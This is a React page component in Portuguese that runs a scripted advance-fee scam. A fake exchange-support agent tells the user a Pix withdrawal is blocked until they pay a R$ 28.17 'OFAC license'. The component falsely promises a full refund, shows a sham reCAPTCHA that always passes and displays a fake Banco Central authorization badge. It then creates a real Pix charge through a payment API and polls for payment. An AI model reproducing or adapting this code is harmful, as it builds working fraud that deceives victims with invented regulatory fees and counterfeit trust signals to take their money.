import { useState, useRef, useEffect, useCallback } from 'react'
import { Link, useLocation } from 'react-router-dom'
import { BadgeCheck, ChevronRight, ExternalLink, Copy, RefreshCw, Lock, Check, CheckCircle2 } from 'lucide-react'
import { useAuth } from '../contexts/AuthContext'

const AVATAR   = 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=200&auto=format&fit=crop'
const BASE_URL = '/api/buckpay'

const fmtBRL = (v: number) => v.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })

type ChatMsg =
  | { kind: 'text';   from: 'agent' | 'user'; text: string }
  | { kind: 'status'; pixKey: string; brl: number }
  | { kind: 'ofac' }
  | { kind: 'captcha' }

type BtnPhase = 'confirm' | 'liberar' | 'funciona' | 'entendido-q' | 'liberar-agora' | 'none'

interface PixData { code: string; qrBase64: string }

function Txt({ text }: { text: string }) {
  return (
    <>
      {text.split(/(\*\*[^*]+\*\*)/).map((p, i) =>
        p.startsWith('**')
          ? <strong key={i} className="text-white font-semibold">{p.slice(2, -2)}</strong>
          : <span key={i}>{p}</span>
      )}
    </>
  )
}

export default function TaxaIOF() {
  const { user, userData } = useAuth()
  const location      = useLocation()
  const initialized   = useRef(false)
  const bottomRef     = useRef<HTMLDivElement>(null)
  const pollRef       = useRef<ReturnType<typeof setInterval> | null>(null)
  const externalIdRef = useRef<string>('')

  const [msgs,       setMsgs]       = useState<ChatMsg[]>([])
  const [btnPhase,   setBtnPhase]   = useState<BtnPhase>('none')
  const [qr,         setQr]         = useState(false)
  const [fadingToQr, setFadingToQr] = useState(false)
  const [captchaOk,  setCaptchaOk]  = useState(false)
  const [captchaTap, setCaptchaTap] = useState(false)
  const [pixData,    setPixData]    = useState<PixData | null>(null)
  const [pixPaid,    setPixPaid]    = useState(false)
  const [copied,     setCopied]     = useState(false)

  const brl    = (location.state as { amount?: number } | null)?.amount ?? 0
  const iof    = 28.17
  const pixKey = (userData?.accounts ?? [])[0]?.pixKey ?? userData?.pixKey ?? '(Sua chave PIX)'
  const nome   = userData?.nome ?? 'usuário'

  const add = (msg: ChatMsg) => setMsgs(p => [...p, msg])
  const txt = (from: 'agent' | 'user', text: string, ms = 0) => {
    const m: ChatMsg = { kind: 'text', from, text }
    ms === 0 ? add(m) : setTimeout(() => add(m), ms)
  }

  useEffect(() => {
    if (!userData || initialized.current) return
    if (brl <= 0) return
    initialized.current = true
    txt('agent', `Olá, **${nome}**! Localizei no sistema o seu saque de **R$ ${fmtBRL(brl)}** destinado à sua chave Pix cadastrada (**${pixKey}**). Você confirma o recebimento deste valor?`)
    setBtnPhase('confirm')
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [userData, brl])

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [msgs, captchaOk, btnPhase, pixPaid])

  // Polling — verifica pagamento a cada 5s
  const startPolling = useCallback(() => {
    if (pollRef.current) return
    pollRef.current = setInterval(async () => {
      try {
        const res = await fetch(`${BASE_URL}/transactions/external_id/${externalIdRef.current}`)
        const json = await res.json()
        if (json.data?.status === 'paid') {
          clearInterval(pollRef.current!)
          pollRef.current = null
          setPixPaid(true)
        }
      } catch { /* ignora erros de rede */ }
    }, 5000)
  }, [])

  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current) }, [])

  // ── Step handlers ────────────────────────────────────────────

  const onConfirm = () => {
    setBtnPhase('none')
    txt('user', 'Sim, eu confirmo!')
    txt('agent', 'Só um segundo, vou consultar o status atual da transferência no barramento de câmbio... 🔍', 800)
    txt('agent', `Localizado! A sua conta e a chave Pix estão corretas, porém o saque consta como **pendente** no sistema. Veja os detalhes na tela de compensação abaixo:`, 2400)
    setTimeout(() => {
      add({ kind: 'status', pixKey, brl })
      setBtnPhase('liberar')
    }, 3000)
  }

  const onLiberar = () => {
    setBtnPhase('none')
    txt('user', 'Como libero o saque?')
    txt('agent', 'Para liberar o envio, é necessária a ativação da licença OFAC. Devido ao fluxo e à conversão de moedas internacionais (como o dólar), a liberação do seu saque exige essa autenticação de segurança cambial.', 800)
    setTimeout(() => { add({ kind: 'ofac' }); setBtnPhase('funciona') }, 1800)
  }

  const onFunciona = () => {
    setBtnPhase('none')
    txt('user', 'Como funciona essa liberação?')
    txt('agent', `É bem simples! O valor de ativação da licença é de **R$ ${fmtBRL(iof)}**. Fique tranquilo: **esse valor é 100% reembolsado na sua conta** junto com o seu saque Pix em no máximo 2 minutos!`, 800)
    txt('agent', 'Para liberar o seu saque com segurança, por favor, realize a validação abaixo:', 1800)
    setTimeout(() => add({ kind: 'captcha' }), 2400)
  }

  const onCaptcha = () => {
    if (captchaTap) return
    setCaptchaTap(true)
    setTimeout(() => {
      setCaptchaOk(true)
      txt('agent', `Verificação de segurança concluída com sucesso! Agora você já está autorizado a ativar a sua licença OFAC e realizar o saque de **R$ ${fmtBRL(brl)}** para a chave Pix **(${pixKey})**.`, 500)
      setTimeout(() => setBtnPhase('entendido-q'), 1300)
    }, 1500)
  }

  const onEntendido = () => {
    setBtnPhase('none')
    txt('user', 'Entendido, o saque vai cair assim que eu liberar a licença OFAC?')
    txt('agent', `Sim! O envio é processado de forma instantânea pelo barramento de câmbio. Em no máximo 2 minutos após a liberação da licença, o valor total de **R$ ${fmtBRL(brl)}** (incluindo o reembolso da licença) será enviado automaticamente para a chave Pix **(${pixKey})**.`, 800)
    setTimeout(() => setBtnPhase('liberar-agora'), 1600)
  }

  const onLiberarAgora = async () => {
    setBtnPhase('none')
    txt('user', 'Entendido! Quero liberar o saque agora')
    txt('agent', `Perfeito! Estou gerando o seu código Pix para ativação da licença OFAC no valor de **R$ ${fmtBRL(iof)}**. Aguarde um instante...`, 800)

    // Gera external_id único por usuário+sessão
    const extId = `iof-${user?.uid ?? 'anon'}-${Date.now()}`
    externalIdRef.current = extId

    try {
      const res = await fetch(`${BASE_URL}/transactions`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          external_id:    extId,
          payment_method: 'pix',
          amount:         Math.round(iof * 100),
        }),
      })
      const json = await res.json()
      if (res.ok && json.data?.pix) {
        setPixData({ code: json.data.pix.code, qrBase64: json.data.pix.qrcode_base64 })
      } else {
        console.error('BuckPay error:', json)
      }
    } catch (e) { console.error('fetch error:', e) }

    setTimeout(() => setFadingToQr(true), 2000)
    setTimeout(() => { setQr(true); startPolling() }, 2800)
  }

  const handleCopy = () => {
    const code = pixData?.code ?? ''
    navigator.clipboard.writeText(code).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000) })
  }

  // ── Render helpers ───────────────────────────────────────────

  function renderMsg(msg: ChatMsg, i: number) {
    if (msg.kind === 'text') return (
      <div key={i} className={`flex ${msg.from === 'user' ? 'justify-end' : 'justify-start'}`}>
        <div className={`flex items-end gap-2.5 max-w-[85%] ${msg.from === 'user' ? 'flex-row-reverse' : ''}`}>
          {msg.from === 'agent' && (
            <div className="w-6 h-6 rounded-full overflow-hidden border border-white/[0.06] shrink-0 mb-0.5">
              <img alt="Ana" className="w-full h-full object-cover" src={AVATAR} />
            </div>
          )}
          <div className={`rounded-2xl px-3.5 py-2.5 text-xs leading-relaxed border whitespace-pre-line ${
            msg.from === 'agent'
              ? 'bg-white/[0.03] border-white/[0.06] text-slate-300 rounded-bl-sm'
              : 'bg-[#1a2a3a] border-blue-900/40 text-slate-200 rounded-br-sm'
          }`}>
            <Txt text={msg.text} />
          </div>
        </div>
      </div>
    )

    if (msg.kind === 'status') return (
      <div key={i} className="flex justify-start">
        <div className="flex items-end gap-2.5 max-w-[92%]">
          <div className="w-6 h-6 rounded-full overflow-hidden border border-white/[0.06] shrink-0 mb-0.5">
            <img alt="Ana" className="w-full h-full object-cover" src={AVATAR} />
          </div>
          <div className="bg-white/[0.03] border border-white/[0.07] rounded-2xl rounded-bl-sm overflow-hidden w-full">
            <div className="px-4 py-2.5 border-b border-white/[0.06]">
              <p className="text-[9px] font-bold text-slate-400 uppercase tracking-widest text-center">Status da Transferência</p>
            </div>
            <div className="px-4 py-3 space-y-3">
              {([
                { label: 'Cadastro do Titular',   ok: true  },
                { label: 'Conta de Destino',      ok: true  },
                { label: 'Saque (Licença OFAC)',  ok: false },
              ] as { label: string; ok: boolean }[]).map((row, j) => (
                <div key={j} className="flex items-center justify-between gap-3">
                  <div className="flex items-center gap-2.5">
                    <div className={`w-7 h-7 rounded-full border flex items-center justify-center shrink-0 ${row.ok ? 'bg-emerald-500/10 border-emerald-500/30' : 'bg-amber-500/10 border-amber-500/30'}`}>
                      {row.ok ? <Check size={12} className="text-emerald-400" /> : <Lock size={11} className="text-amber-400" />}
                    </div>
                    <span className="text-xs font-semibold text-white">{j + 1}. {row.label}</span>
                  </div>
                  <span className={`text-[10px] font-semibold flex items-center gap-1 ${row.ok ? 'text-emerald-400' : 'text-amber-400'}`}>
                    {row.ok ? <>Confirmado <Check size={10} /></> : <>Pendente <Lock size={10} /></>}
                  </span>
                </div>
              ))}
            </div>
            <div className="px-4 py-3 border-t border-white/[0.06] space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-[10px] text-slate-500">Chave PIX:</span>
                <span className="text-[10px] font-mono text-slate-300">{msg.pixKey}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-[10px] text-slate-500">Saque Total:</span>
                <span className="text-xs font-bold text-white">R$ {fmtBRL(msg.brl)}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    )

    if (msg.kind === 'ofac') return (
      <div key={i} className="flex justify-start">
        <div className="flex items-end gap-2.5 max-w-[92%]">
          <div className="w-6 h-6 rounded-full overflow-hidden border border-white/[0.06] shrink-0 mb-0.5">
            <img alt="Ana" className="w-full h-full object-cover" src={AVATAR} />
          </div>
          <div style={{ background: '#fff', color: '#111', borderRadius: '16px', borderBottomLeftRadius: '4px', padding: '16px', width: '100%' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '8px' }}>
              <div style={{ width: 48, height: 48, flexShrink: 0 }}>
                <img src="/ofac.webp" alt="OFAC" style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
              </div>
              <div>
                <p style={{ fontSize: '11px', fontWeight: 700, color: '#111' }}>Office of Foreign Assets Control (OFAC)</p>
                <p style={{ fontSize: '9px', fontWeight: 600, color: '#1d4ed8', textTransform: 'uppercase', letterSpacing: '0.05em', marginTop: 2 }}>Escritório de Controle de Ativos Estrangeiros</p>
              </div>
            </div>
            <p style={{ fontSize: '11px', color: '#4b5563', lineHeight: 1.5 }}>
              Órgão federal regulador que autoriza a liberação e transferência de moedas convertidas internacionalmente.
            </p>
          </div>
        </div>
      </div>
    )

    if (msg.kind === 'captcha') return (
      <div key={i} className="flex justify-start">
        <div className="flex items-end gap-2.5 max-w-[92%]">
          <div className="w-6 h-6 rounded-full overflow-hidden border border-white/[0.06] shrink-0 mb-0.5">
            <img alt="Ana" className="w-full h-full object-cover" src={AVATAR} />
          </div>
          <button onClick={onCaptcha} disabled={captchaTap}
            style={{ background: '#fff', borderRadius: '16px', borderBottomLeftRadius: '4px', padding: '14px 16px', display: 'flex', alignItems: 'center', gap: '12px', width: 260, cursor: captchaTap ? 'default' : 'pointer' }}
          >
            <div style={{
              width: 24, height: 24, borderRadius: 4,
              border: captchaOk ? 'none' : '2px solid #9ca3af',
              background: captchaOk ? '#10b981' : captchaTap ? '#f3f4f6' : '#fff',
              display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
              transition: 'all 0.3s',
            }}>
              {captchaOk && <Check size={14} color="#fff" />}
              {captchaTap && !captchaOk && (
                <div style={{ width: 12, height: 12, border: '2px solid #4A90D9', borderTopColor: 'transparent', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }} />
              )}
            </div>
            <div style={{ textAlign: 'left', flex: 1 }}>
              <p style={{ fontSize: 12, fontWeight: 600, color: '#1f2937' }}>Não sou um robô</p>
              {captchaOk && <p style={{ fontSize: 10, color: '#059669', marginTop: 2 }}>Verificado com sucesso</p>}
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 2, flexShrink: 0 }}>
              <svg viewBox="0 0 64 64" style={{ width: 28, height: 28 }} fill="none">
                <circle cx="32" cy="32" r="30" stroke="#4A90D9" strokeWidth="4" />
                <path d="M20 32 L28 40 L44 24" stroke="#4A90D9" strokeWidth="4" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
              <p style={{ fontSize: 7, color: '#9ca3af', fontWeight: 600, letterSpacing: '0.05em' }}>reCAPTCHA</p>
              <p style={{ fontSize: 6, color: '#d1d5db' }}>Privacidade · Termos</p>
            </div>
          </button>
        </div>
      </div>
    )

    return null
  }

  const btnLabel: Record<BtnPhase, string> = {
    'confirm':       'Sim, eu confirmo!',
    'liberar':       'Como libero o saque?',
    'funciona':      'Como funciona essa liberação?',
    'entendido-q':   'Entendido, o saque vai cair assim que eu liberar a licença OFAC?',
    'liberar-agora': 'Entendido! Quero liberar o saque agora',
    'none':          '',
  }

  const btnAction: Record<BtnPhase, (() => void) | null> = {
    'confirm':       onConfirm,
    'liberar':       onLiberar,
    'funciona':      onFunciona,
    'entendido-q':   onEntendido,
    'liberar-agora': onLiberarAgora,
    'none':          null,
  }

  // ── Render ───────────────────────────────────────────────────

  return (
    <div className="h-screen w-screen bg-[#050505] text-white flex flex-col select-none overflow-hidden" style={{ fontFamily: 'Inter, sans-serif' }}>
      <style>{`
        @keyframes fadeIn { from { opacity:0; transform:translateY(8px); } to { opacity:1; transform:translateY(0); } }
        @keyframes spin   { to { transform: rotate(360deg); } }
      `}</style>

      <div className="fixed inset-0 pointer-events-none opacity-20" style={{
        backgroundImage: 'linear-gradient(rgba(255,255,255,0.01) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.01) 1px, transparent 1px)',
        backgroundSize: '40px 40px',
      }} />
      <div className="fixed top-0 left-1/4 -translate-x-1/2 w-[400px] h-[400px] rounded-full bg-blue-500/5 blur-[100px] pointer-events-none" />

      <main className="flex-1 max-w-xl w-full mx-auto p-4 flex flex-col min-h-0 relative z-10">
        <div className="flex-1 border border-white/[0.04] rounded-3xl flex flex-col overflow-hidden min-h-0"
          style={{ background: 'rgba(255,255,255,0.008)', boxShadow: '0 32px 64px rgba(0,0,0,0.7)' }}
        >
          {/* header */}
          <div className="shrink-0 px-4 py-3.5 border-b border-white/[0.04] bg-white/[0.01] flex items-center gap-3">
            <div className="relative shrink-0">
              <div className="w-10 h-10 rounded-full overflow-hidden border border-blue-500/20">
                <img alt="Ana Beatriz" className="w-full h-full object-cover" src={AVATAR} />
              </div>
              <div className="absolute bottom-0 right-0 w-2.5 h-2.5 bg-emerald-500 border-2 border-[#050505] rounded-full" />
            </div>
            <div>
              <h3 className="text-xs font-semibold text-white leading-none flex items-center gap-1.5">
                Ana Beatriz · Suporte de Câmbio
                <BadgeCheck size={12} className="text-blue-400" aria-hidden />
              </h3>
              <p className="text-[10px] text-slate-500 mt-1">Suporte Cambial Wizzer</p>
            </div>
          </div>

          {/* QR code screen */}
          {qr ? (
            <div className="flex-1 p-6 flex flex-col items-center justify-between overflow-y-auto gap-6"
              style={{ opacity: 0, animation: 'fadeIn 0.8s ease 0.1s forwards' }}
            >
              {pixPaid ? (
                /* ── Pago! ── */
                <div className="flex-1 flex flex-col items-center justify-center gap-5 text-center"
                  style={{ animation: 'fadeIn 0.6s ease forwards' }}
                >
                  <div className="w-20 h-20 rounded-full bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center">
                    <CheckCircle2 size={40} className="text-emerald-400" />
                  </div>
                  <div>
                    <p className="text-lg font-bold text-white mb-1">Licença ativada com sucesso!</p>
                    <p className="text-sm text-slate-400 leading-relaxed">
                      Seu saque de <strong className="text-white">R$ {fmtBRL(brl)}</strong> será processado e enviado para a chave Pix <strong className="text-white">{pixKey}</strong> em até 2 minutos.
                    </p>
                  </div>
                  <Link to="/dashboard" className="mt-2 px-6 py-3 bg-emerald-600 hover:bg-emerald-500 rounded-xl text-sm font-semibold text-white transition-all active:scale-95">
                    Voltar ao Dashboard
                  </Link>
                </div>
              ) : (
                /* ── Aguardando pagamento ── */
                <div className="flex flex-col items-center gap-5 w-full max-w-sm">
                  {/* QR image */}
                  <div className="p-4 bg-white rounded-3xl" style={{ boxShadow: '0 8px 32px rgba(0,0,0,0.6)' }}>
                    {pixData?.qrBase64 ? (
                      <img alt="QR Code PIX" className="w-40 h-40 block"
                        src={`data:image/png;base64,${pixData.qrBase64}`} />
                    ) : (
                      <div className="w-40 h-40 flex items-center justify-center">
                        <div className="w-8 h-8 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
                      </div>
                    )}
                  </div>

                  {/* copy-paste */}
                  {pixData?.code && (
                    <div className="w-full space-y-3">
                      <label className="text-[9px] font-semibold text-slate-500 uppercase tracking-widest block">Pix Copia e Cola</label>
                      <input readOnly className="w-full bg-white/[0.01] border border-white/[0.06] rounded-xl px-4 py-3.5 text-[10px] font-mono text-slate-400 focus:outline-none select-all" value={pixData.code} />
                      <button onClick={handleCopy} className="w-full flex items-center justify-center gap-2 py-4 px-8 rounded-xl font-semibold text-xs transition-all duration-200 active:scale-95 bg-white hover:bg-slate-50 text-black">
                        {copied ? <Check size={14} /> : <Copy size={14} />}
                        {copied ? 'Copiado!' : 'Copiar Código Pix'}
                      </button>
                    </div>
                  )}

                  <div className="w-full text-center text-xs text-slate-400 leading-normal font-semibold bg-white/[0.01] border border-white/[0.04] rounded-2xl p-3.5">
                    O valor pago será reembolsado e enviado junto com o seu saque na sua conta de uma só vez.
                  </div>

                  <div className="flex items-center gap-1.5 text-xs text-slate-500 font-semibold border-t border-white/[0.04] pt-4 w-full max-w-sm">
                    <RefreshCw size={11} className="animate-spin text-blue-400" />
                    Aguardando pagamento...
                  </div>
                </div>
              )}
            </div>

          ) : (
            /* chat */
            <>
              <div className="flex-1 p-4 space-y-4 overflow-y-auto min-h-0"
                style={{ opacity: fadingToQr ? 0 : 1, transition: 'opacity 0.6s ease' }}
              >
                {msgs.length === 0
                  ? <div className="flex justify-center py-8"><div className="w-5 h-5 border-2 border-blue-600 border-t-transparent rounded-full animate-spin" /></div>
                  : msgs.map((m, i) => renderMsg(m, i))
                }
                <div ref={bottomRef} />
              </div>

              <div className="shrink-0 p-4 border-t border-white/[0.04] bg-black/30 flex flex-col gap-2"
                style={{ opacity: fadingToQr ? 0 : 1, transition: 'opacity 0.4s ease' }}
              >
                {btnPhase !== 'none' && (
                  <button onClick={() => btnAction[btnPhase]?.()}
                    className="w-full bg-white/[0.03] hover:bg-white/[0.06] border border-white/[0.08] text-slate-200 hover:text-white py-4 px-4 rounded-xl text-xs font-semibold tracking-wide transition-all duration-200 active:scale-95 flex items-center justify-between text-left gap-2"
                  >
                    <span>{btnLabel[btnPhase]}</span>
                    <ChevronRight size={13} className="opacity-50 shrink-0" aria-hidden />
                  </button>
                )}
                <Link to="/dashboard" className="w-full bg-white/[0.01] hover:bg-white/[0.03] border border-white/[0.05] text-slate-600 hover:text-slate-400 py-3 px-4 rounded-xl text-xs font-semibold tracking-wide transition-all duration-200 active:scale-95 flex items-center justify-between">
                  <span>Voltar ao Dashboard</span>
                  <ChevronRight size={13} className="opacity-40" aria-hidden />
                </Link>
              </div>
            </>
          )}
        </div>
      </main>

      <footer className="shrink-0 pb-6 pt-1 px-4 text-center relative z-10">
        <div className="inline-flex items-center gap-2 bg-blue-500/5 border border-blue-500/10 rounded-xl px-3 py-1.5">
          <span className="flex h-1.5 w-1.5 relative shrink-0">
            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75" />
            <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-blue-500" />
          </span>
          <img alt="Banco Central" className="h-[14px] w-auto object-contain brightness-0 invert opacity-60"
            src="https://www.techfx.com.br/wp-content/themes/theme-wp/src/assets/images/logo-banco-central-do-brasil.svg" />
          <p className="text-[10px] text-slate-400 font-medium">
            Instituição autorizada ·{' '}
            <a href="https://www.bcb.gov.br/rex/iamc/port/correspondentes/correspondentes.asp?frame=1" target="_blank" rel="noopener noreferrer"
              className="text-blue-400 hover:text-blue-300 font-bold underline underline-offset-2 inline-flex items-center gap-0.5">
              Confira a Wizzer no Banco Central <ExternalLink size={9} aria-hidden />
            </a>
          </p>
        </div>
      </footer>
    </div>
  )
}
